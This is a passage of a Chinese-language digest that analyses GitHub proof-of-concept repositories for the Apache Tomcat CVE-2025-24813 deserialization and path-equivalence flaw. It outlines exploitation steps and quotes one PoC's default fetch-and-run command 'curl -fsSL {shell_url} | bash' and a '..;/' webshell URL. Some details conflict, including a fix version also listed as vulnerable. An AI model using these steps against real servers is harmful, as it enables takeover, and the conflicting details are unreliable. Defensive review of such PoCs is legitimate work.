**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

